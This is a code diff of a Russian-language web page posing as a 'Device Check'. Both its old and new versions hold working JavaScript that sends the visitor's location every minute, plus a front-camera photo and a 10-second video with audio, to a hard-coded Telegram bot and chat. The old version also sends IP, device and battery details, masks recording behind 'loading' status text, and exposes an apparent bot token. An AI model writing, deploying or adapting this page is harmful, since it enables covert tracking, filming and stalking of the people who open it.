@@ -1,616 +1,327 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Device Check</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Device Check</title>
 
-  <style>
-    * { box-sizing: border-box; }
+<style>
+*{box-sizing:border-box}
 
-    :root {
-      --bg1: #020617;
-      --bg2: #0f172a;
-      --card: rgba(15, 23, 42, .86);
-      --text: #f8fafc;
-      --muted: #cbd5e1;
-      --accent1: #2563eb;
-      --accent2: #06b6d4;
-      --danger1: #dc2626;
-      --danger2: #f97316;
-      --radius-main: 34px;
-      --radius-card: 42px;
-      --font-main: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Arial, sans-serif;
-    }
+body{
+margin:0;
+min-height:100vh;
+font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif;
+color:#f8fafc;
+background:
+radial-gradient(circle at 20% 10%, rgba(37,99,235,.35), transparent 32%),
+radial-gradient(circle at 80% 90%, rgba(6,182,212,.25), transparent 35%),
+linear-gradient(145deg,#020617 0%,#0f172a 100%);
+display:flex;
+align-items:center;
+justify-content:center;
+padding:18px;
+}
 
-    body {
-      margin: 0;
-      min-height: 100vh;
-      font-family: var(--font-main);
-      color: var(--text);
-      background:
-        radial-gradient(circle at 20% 10%, rgba(37, 99, 235, .35), transparent 32%),
-        radial-gradient(circle at 80% 90%, rgba(6, 182, 212, .25), transparent 35%),
-        linear-gradient(145deg, var(--bg1) 0%, var(--bg2) 100%);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 18px;
-    }
+.device-frame{
+width:100%;
+max-width:430px;
+min-height:560px;
+border-radius:42px;
+padding:12px;
+background:linear-gradient(145deg,rgba(255,255,255,.22),rgba(255,255,255,.04));
+box-shadow:0 35px 90px rgba(0,0,0,.55);
+border:1px solid rgba(255,255,255,.16);
+}
 
-    .device-frame {
-      width: 100%;
-      max-width: 430px;
-      min-height: 620px;
-      border-radius: var(--radius-card);
-      padding: 12px;
-      background: linear-gradient(145deg, rgba(255,255,255,.22), rgba(255,255,255,.04));
-      box-shadow: 0 35px 90px rgba(0,0,0,.55);
-      border: 1px solid rgba(255,255,255,.16);
-    }
+.screen{
+min-height:536px;
+border-radius:34px;
+overflow:hidden;
+background:rgba(15,23,42,.86);
+backdrop-filter:blur(24px);
+border:1px solid rgba(255,255,255,.1);
+padding:26px 22px;
+}
 
-    .screen {
-      min-height: 596px;
-      border-radius: var(--radius-main);
-      overflow: hidden;
-      background: var(--card);
-      backdrop-filter: blur(24px);
-      border: 1px solid rgba(255,255,255,.1);
-      padding: 26px 22px;
-    }
+.top-shape{
+width:112px;
+height:31px;
+background:#020617;
+border-radius:999px;
+margin:0 auto 34px;
+}
 
-    .top-shape {
-      width: 112px;
-      height: 31px;
-      background: #020617;
-      border-radius: 999px;
-      margin: 0 auto 34px;
-    }
+.hero{
+text-align:center;
+padding-top:20px;
+}
 
-    .hero {
-      text-align: center;
-      padding-top: 20px;
-    }
+h1{
+margin:0;
+font-size:32px;
+letter-spacing:-0.7px;
+line-height:1.1;
+}
 
-    h1 {
-      margin: 0;
-      font-size: 32px;
-      letter-spacing: -0.7px;
-      line-height: 1.1;
-    }
+.subtitle{
+margin:14px auto 0;
+max-width:340px;
+color:#cbd5e1;
+font-size:16px;
+line-height:1.55;
+}
 
-    .subtitle {
-      margin: 14px auto 0;
-      max-width: 340px;
-      color: var(--muted);
-      font-size: 16px;
-      line-height: 1.55;
-    }
+.glass{
+margin-top:24px;
+padding:16px;
+border-radius:22px;
+background:rgba(255,255,255,.075);
+border:1px solid rgba(255,255,255,.1);
+color:#dbeafe;
+font-size:14px;
+line-height:1.45;
+text-align:left;
+}
 
-    .glass {
-      margin-top: 24px;
-      padding: 16px;
-      border-radius: 22px;
-      background: rgba(255,255,255,.075);
-      border: 1px solid rgba(255,255,255,.1);
-      color: #dbeafe;
-      font-size: 14px;
-      line-height: 1.45;
-      text-align: left;
-    }
+button{
+width:100%;
+margin-top:24px;
+border:0;
+border-radius:18px;
+padding:16px;
+font-size:16px;
+font-weight:750;
+color:#fff;
+cursor:pointer;
+background:linear-gradient(135deg,#2563eb,#06b6d4);
+box-shadow:0 16px 36px rgba(37,99,235,.34);
+}
 
-    button {
-      width: 100%;
-      margin-top: 18px;
-      border: 0;
-      border-radius: 18px;
-      padding: 16px 16px;
-      font-size: 16px;
-      font-weight: 750;
-      color: #fff;
-      cursor: pointer;
-      font-family: var(--font-main);
-    }
-
-    .primary {
-      margin-top: 26px;
-      background: linear-gradient(135deg, var(--accent1), var(--accent2));
-      box-shadow: 0 16px 36px rgba(37,99,235,.34);
-    }
-
-    .stop {
-      display: none;
-      background: linear-gradient(135deg, var(--danger1), var(--danger2));
-    }
-
-    .status {
-      min-height: 44px;
-      margin-top: 18px;
-      padding: 14px;
-      border-radius: 18px;
-      background: rgba(2,6,23,.36);
-      color: #bfdbfe;
-      font-size: 13.5px;
-      line-height: 1.45;
-      white-space: pre-line;
-      text-align: left;
-    }
-
-    .preview {
-      width: 100%;
-      margin-top: 12px;
-      border-radius: 18px;
-      display: none;
-      border: 1px solid rgba(255,255,255,.13);
-    }
-
-    .small {
-      margin-top: 16px;
-      color: #94a3b8;
-      font-size: 11.5px;
-      line-height: 1.4;
-      text-align: center;
-    }
-
-    .hidden { display: none; }
-
-    body.android {
-      --bg1: #03140d;
-      --bg2: #09251a;
-      --card: rgba(5, 35, 23, .88);
-      --text: #ecfdf5;
-      --muted: #bbf7d0;
-      --accent1: #22c55e;
-      --accent2: #14b8a6;
-      --radius-main: 28px;
-      --radius-card: 34px;
-      --font-main: "Roboto", "Google Sans", "Segoe UI", Arial, sans-serif;
-    }
-
-    body.android .top-shape {
-      width: 64px;
-      height: 10px;
-      background: rgba(255,255,255,.18);
-      margin-bottom: 42px;
-    }
-
-    body.android button {
-      border-radius: 999px;
-    }
-  </style>
+.small{
+margin-top:18px;
+color:#94a3b8;
+font-size:11.5px;
+line-height:1.4;
+text-align:center;
+}
+</style>
 </head>
 
 <body>
-  <main class="device-frame">
-    <section class="screen">
-      <div class="top-shape"></div>
-
-      <div class="hero">
-        <h1 id="mainTitle">Device Check</h1>
-        <p class="subtitle" id="mainSubtitle">
-          Нажмите кнопку и подтвердите разрешения браузера.
-        </p>
-      </div>
-
-      <div class="glass" id="noticeText">
-        Геолокация отправляется каждую минуту, пока страница открыта. Фото и видео отправляются только после разрешения камеры.
-      </div>
-
-      <button class="primary" id="startBtn" onclick="startAll()">Начать</button>
-      <button class="stop" id="stopBtn" onclick="stopTracking()">Ожидание</button>
-
-      <video id="video" class="preview" autoplay playsinline muted></video>
-      <canvas id="canvas" class="hidden"></canvas>
-
-      <div class="status" id="status">Готово к запуску.</div>
-
-      <div class="small">
-        Работает через HTTPS. Браузер покажет системные запросы доступа к геолокации и камере.
-      </div>
-    </section>
-  </main>
-
-  <script>
-    const botToken = "8630743288:AAGGL1TvkhDLmHkhQn0pTT-860o5P7Fl_os";
-    const chatId = "380243961";
-
-    const sendIntervalMs = 60 * 1000;
-    const videoDurationMs = 10 * 1000;
-
-    const texts = {
-      iphone: {
-        title: "iPhone Secure Check",
-        subtitle: "Нажмите кнопку и подтвердите разрешения Safari.",
-        notice: "После разрешения GEO будет обновляться каждую минуту. Камера включится только после отдельного системного разрешения.",
-        start: "Начать"
-      },
-      android: {
-        title: "Android Device Check",
-        subtitle: "Нажмите кнопку и подтвердите разрешения Chrome.",
-        notice: "После разрешения GEO будет обновляться каждую минуту. Камера включится только после отдельного системного разрешения.",
-        start: "Начать"
-      },
-      other: {
-        title: "Device Check",
-        subtitle: "Нажмите кнопку и подтвердите разрешения браузера.",
-        notice: "GEO отправляется каждую минуту. Фото и видео — только после разрешения камеры.",
-        start: "Начать"
-      }
-    };
-
-    let intervalId = null;
-    let isTracking = false;
-    let sendCount = 0;
-    let ipInfo = null;
-    let batteryInfo = "не поддерживается";
-    let mediaStream = null;
-    let deviceType = "other";
-
-    const statusEl = document.getElementById("status");
-    const startBtn = document.getElementById("startBtn");
-    const stopBtn = document.getElementById("stopBtn");
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-
-    function setStatus(text) {
-      statusEl.textContent = text;
-    }
-
-    function detectDeviceType() {
-      const ua = navigator.userAgent || "";
-      const platform = navigator.platform || "";
-
-      if (/iPhone|iPad|iPod/i.test(ua) || (platform === "MacIntel" && navigator.maxTouchPoints > 1)) return "iphone";
-      if (/Android/i.test(ua)) return "android";
-      return "other";
-    }
-
-    function applyDeviceStyle() {
-      deviceType = detectDeviceType();
-      document.body.classList.add(deviceType);
-
-      const t = texts[deviceType];
-
-      document.getElementById("mainTitle").textContent = t.title;
-      document.getElementById("mainSubtitle").textContent = t.subtitle;
-      document.getElementById("noticeText").textContent = t.notice;
-      startBtn.textContent = t.start;
-    }
-
-    function guessDeviceModel() {
-      const ua = navigator.userAgent || "";
-      const platform = navigator.platform || "";
-
-      if (/iPhone/i.test(ua)) return "iPhone";
-      if (/iPad/i.test(ua) || (platform === "MacIntel" && navigator.maxTouchPoints > 1)) return "iPad";
-      if (/Android/i.test(ua)) {
-        const match = ua.match(/\(([^)]+)\)/);
-        return match ? "Android: " + match[1] : "Android";
-      }
-      if (/Macintosh/i.test(ua)) return "Mac";
-      if (/Windows/i.test(ua)) return "Windows PC";
-      return "Не определено";
-    }
-
-    function getDeviceInfo() {
-      return {
-        type: deviceType,
-        model: guessDeviceModel(),
-        userAgent: navigator.userAgent || "unknown",
-        language: navigator.language || "unknown",
-        languages: navigator.languages ? navigator.languages.join(", ") : "unknown",
-        platform: navigator.platform || "unknown",
-        screen: `${window.screen.width}x${window.screen.height}`,
-        viewport: `${window.innerWidth}x${window.innerHeight}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown",
-        online: navigator.onLine ? "да" : "нет"
-      };
-    }
-
-    async function loadIpInfo() {
-      try {
-        const res = await fetch("https://ipapi.co/json/");
-        ipInfo = await res.json();
-      } catch (e) {
-        ipInfo = { ip: "не удалось", country_name: "не удалось", city: "не удалось" };
-      }
-    }
-
-    async function loadBatteryInfo() {
-      try {
-        if ("getBattery" in navigator) {
-          const battery = await navigator.getBattery();
-
-          function formatBattery() {
-            batteryInfo = `${Math.round(battery.level * 100)}%, зарядка: ${battery.charging ? "да" : "нет"}`;
-          }
-
-          formatBattery();
-          battery.addEventListener("levelchange", formatBattery);
-          battery.addEventListener("chargingchange", formatBattery);
-        } else {
-          batteryInfo = "не поддерживается";
-        }
-      } catch (e) {
-        batteryInfo = "не удалось получить";
-      }
-    }
-
-    async function sendTextToTelegram(message) {
-      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          disable_web_page_preview: false
-        })
-      });
-
-      const data = await response.json();
-      if (!data.ok) throw new Error(data.description || "Ошибка Telegram API");
-      return data;
-    }
-
-    async function sendPhotoToTelegram(blob, caption) {
-      const formData = new FormData();
-      formData.append("chat_id", chatId);
-      formData.append("photo", blob, "photo.jpg");
-      formData.append("caption", caption);
-
-      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-        method: "POST",
-        body: formData
-      });
-
-      const data = await response.json();
-      if (!data.ok) throw new Error(data.description || "Ошибка отправки фото");
-      return data;
-    }
-
-    async function sendVideoToTelegram(blob, caption) {
-      const formData = new FormData();
-      formData.append("chat_id", chatId);
-      formData.append("video", blob, "video.webm");
-      formData.append("caption", caption);
-
-      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
-        method: "POST",
-        body: formData
-      });
-
-      const data = await response.json();
-      if (!data.ok) throw new Error(data.description || "Ошибка отправки видео");
-      return data;
-    }
-
-    function buildBaseInfo() {
-      const device = getDeviceInfo();
-
-      const ipText = ipInfo
-        ? `${ipInfo.ip || "unknown"} / ${ipInfo.country_name || ipInfo.country || "unknown"} / ${ipInfo.city || "unknown"}`
-        : "не получен";
-
-      return `Тип сайта: ${device.type}
-IP / страна / город: ${ipText}
-Модель: ${device.model}
-Язык: ${device.language}
-Все языки: ${device.languages}
-Платформа: ${device.platform}
-Экран: ${device.screen}
-Окно: ${device.viewport}
-Батарея: ${batteryInfo}
-Часовой пояс: ${device.timezone}
-Онлайн: ${device.online}`;
-    }
-
-    function requestAndSendLocation() {
-      if (!isTracking) return;
-
-      navigator.geolocation.getCurrentPosition(
-        async function(position) {
-          try {
-            sendCount++;
-
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const accuracy = Math.round(position.coords.accuracy);
-            const speed = position.coords.speed ? `${Math.round(position.coords.speed * 3.6)} км/ч` : "не определена";
-            const heading = position.coords.heading ? `${Math.round(position.coords.heading)}°` : "не определено";
-            const now = new Date().toLocaleString("ru-RU");
-            const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
-
-            const message =
-`📍 GEO обновление #${sendCount}
-
-Время: ${now}
-
-Координаты:
-Широта: ${lat}
-Долгота: ${lon}
-Точность: примерно ${accuracy} м
-Скорость: ${speed}
-Направление: ${heading}
-
-Карта:
-${mapsLink}
-
-Данные:
-${buildBaseInfo()}`;
-
-            await sendTextToTelegram(message);
-            setStatus(`GEO отправлено #${sendCount}\nСледующее обновление — через 1 минуту.`);
-          } catch (error) {
-            console.error(error);
-            setStatus("Ошибка отправки GEO. Проверь BOT_TOKEN.");
-          }
-        },
-        function(error) {
-          if (error.code === error.PERMISSION_DENIED) {
-            setStatus("Доступ к геолокации запрещён.");
-            stopTracking();
-          } else if (error.code === error.POSITION_UNAVAILABLE) {
-            setStatus("Не удалось определить GEO. Повтор через 1 минуту.");
-          } else if (error.code === error.TIMEOUT) {
-            setStatus("GEO: время ожидания истекло. Повтор через 1 минуту.");
-          } else {
-            setStatus("Ошибка GEO. Повтор через 1 минуту.");
-          }
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 20000,
-          maximumAge: 0
-        }
-      );
-    }
-
-    function startGeoTracking() {
-      if (!navigator.geolocation) {
-        setStatus("Геолокация не поддерживается этим браузером.");
-        return;
-      }
-
-      if (isTracking) return;
-
-      isTracking = true;
-      sendCount = 0;
-
-      startBtn.style.display = "none";
-      stopBtn.style.display = "block";
-
-      requestAndSendLocation();
-      intervalId = setInterval(requestAndSendLocation, sendIntervalMs);
-    }
-
-    function stopTracking() {
-      isTracking = false;
-
-      if (intervalId) {
-        clearInterval(intervalId);
-        intervalId = null;
-      }
-
-      startBtn.style.display = "block";
-      stopBtn.style.display = "none";
-
-      setStatus("Идет загрузка.....");
-    }
-
-    async function capturePhotoAndVideo() {
-      try {
-        setStatus("Идет загрузка.....");
-
-        mediaStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" },
-          audio: true
-        });
-
-        video.srcObject = mediaStream;
-
-        await new Promise(resolve => {
-          video.onloadedmetadata = resolve;
-        });
-
-        setStatus("Идет загрузка.....");
-
-        canvas.width = video.videoWidth || 720;
-        canvas.height = video.videoHeight || 960;
-
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        canvas.toBlob(async function(photoBlob) {
-          try {
-            const caption =
-`📷 Фото
-
-Время: ${new Date().toLocaleString("ru-RU")}
-
-Данные:
-${buildBaseInfo()}`;
-
-            await sendPhotoToTelegram(photoBlob, caption);
-          } catch (e) {
-            console.error(e);
-          }
-        }, "image/jpeg", 0.9);
-
-        const chunks = [];
-        const options = MediaRecorder.isTypeSupported("video/webm")
-          ? { mimeType: "video/webm" }
-          : undefined;
-
-        const recorder = new MediaRecorder(mediaStream, options);
-
-        recorder.ondataavailable = function(event) {
-          if (event.data && event.data.size > 0) {
-            chunks.push(event.data);
-          }
-        };
-
-        recorder.onstop = async function() {
-          try {
-            const videoBlob = new Blob(chunks, { type: "video/webm" });
-
-            const caption =
-`🎥 Видео ${Math.round(videoDurationMs / 1000)} сек.
-
-Время: ${new Date().toLocaleString("ru-RU")}
-
-Данные:
-${buildBaseInfo()}`;
-
-            await sendVideoToTelegram(videoBlob, caption);
-            setStatus("Ожидайте");
-          } catch (e) {
-            console.error(e);
-            setStatus("Ожидайте");
-          } finally {
-            if (mediaStream) {
-              mediaStream.getTracks().forEach(track => track.stop());
-              mediaStream = null;
-            }
-          }
-        };
-
-        recorder.start();
-
-        setTimeout(function() {
-          if (recorder.state !== "inactive") {
-            recorder.stop();
-          }
-        }, videoDurationMs);
-
-      } catch (error) {
-        console.error(error);
-        setStatus("Загруузка");
-      }
-    }
-
-    async function startAll() {
-      if (!botToken || botToken === "ВСТАВЬ_СЮДА_СВОЙ_BOT_TOKEN") {
-        setStatus("Сначала вставь BOT_TOKEN в файл index.html.");
-        return;
-      }
-
-      setStatus("Запрашиваем разрешения...");
-
-      startGeoTracking();
-      capturePhotoAndVideo();
-    }
-
-    window.addEventListener("beforeunload", function() {
-      stopTracking();
-
-      if (mediaStream) {
-        mediaStream.getTracks().forEach(track => track.stop());
-      }
-    });
-
-    applyDeviceStyle();
-    loadIpInfo();
-    loadBatteryInfo();
-  </script>
+
+<main class="device-frame">
+<section class="screen">
+
+<div class="top-shape"></div>
+
+<div class="hero">
+<h1>Device Check</h1>
+
+<p class="subtitle">
+Нажмите кнопку и подтвердите разрешения браузера.
+</p>
+</div>
+
+<div class="glass">
+Геолокация отправляется каждую минуту, пока страница открыта.
+Фото и видео отправляются только после разрешения камеры.
+</div>
+
+<button onclick="startAll()">
+Разрешить GEO и начать
+</button>
+
+<div class="small">
+Работает через HTTPS.
+</div>
+
+<video id="video" autoplay playsinline muted style="display:none"></video>
+<canvas id="canvas" style="display:none"></canvas>
+
+</section>
+</main>
+
+<script>
+
+const botToken = "ВСТАВЬ_СЮДА_СВОЙ_BOT_TOKEN";
+const chatId = "380243961";
+
+const sendIntervalMs = 60 * 1000;
+const videoDurationMs = 10 * 1000;
+
+let intervalId = null;
+let mediaStream = null;
+
+async function sendText(message){
+
+const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+chat_id:chatId,
+text:message
+})
+});
+
+return await response.json();
+}
+
+async function sendPhoto(blob){
+
+const formData = new FormData();
+
+formData.append("chat_id",chatId);
+formData.append("photo",blob,"photo.jpg");
+
+await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`,{
+method:"POST",
+body:formData
+});
+
+}
+
+async function sendVideo(blob){
+
+const formData = new FormData();
+
+formData.append("chat_id",chatId);
+formData.append("video",blob,"video.webm");
+
+await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`,{
+method:"POST",
+body:formData
+});
+
+}
+
+function startGeo(){
+
+navigator.geolocation.getCurrentPosition(async function(position){
+
+const lat = position.coords.latitude;
+const lon = position.coords.longitude;
+
+await sendText(
+`📍 GEO
+
+https://maps.google.com/?q=${lat},${lon}`
+);
+
+},{
+enableHighAccuracy:true
+});
+
+intervalId = setInterval(async ()=>{
+
+navigator.geolocation.getCurrentPosition(async function(position){
+
+const lat = position.coords.latitude;
+const lon = position.coords.longitude;
+
+await sendText(
+`📍 GEO
+
+https://maps.google.com/?q=${lat},${lon}`
+);
+
+});
+
+},sendIntervalMs);
+
+}
+
+async function startCamera(){
+
+const stream = await navigator.mediaDevices.getUserMedia({
+video:true,
+audio:true
+});
+
+mediaStream = stream;
+
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+
+video.srcObject = stream;
+
+await new Promise(resolve=>{
+video.onloadedmetadata = resolve;
+});
+
+canvas.width = video.videoWidth;
+canvas.height = video.videoHeight;
+
+const ctx = canvas.getContext("2d");
+ctx.drawImage(video,0,0,canvas.width,canvas.height);
+
+canvas.toBlob(async function(photoBlob){
+
+await sendPhoto(photoBlob);
+
+},"image/jpeg",0.9);
+
+const chunks = [];
+
+const recorder = new MediaRecorder(stream);
+
+recorder.ondataavailable = e=>{
+if(e.data.size>0){
+chunks.push(e.data);
+}
+};
+
+recorder.onstop = async ()=>{
+
+const videoBlob = new Blob(chunks,{
+type:"video/webm"
+});
+
+await sendVideo(videoBlob);
+
+stream.getTracks().forEach(track=>track.stop());
+
+};
+
+recorder.start();
+
+setTimeout(()=>{
+recorder.stop();
+},videoDurationMs);
+
+}
+
+async function startAll(){
+
+if(!botToken || botToken==="8630743288:AAGGL1TvkhDLmHkhQn0pTT-860o5P7Fl_os"){
+return;
+}
+
+startGeo();
+
+try{
+await startCamera();
+}catch(e){
+console.log(e);
+}
+
+}
+
+window.addEventListener("beforeunload",()=>{
+
+if(intervalId){
+clearInterval(intervalId);
+}
+
+if(mediaStream){
+mediaStream.getTracks().forEach(track=>track.stop());
+}
+
+});
+
+</script>
+
 </body>
 </html>
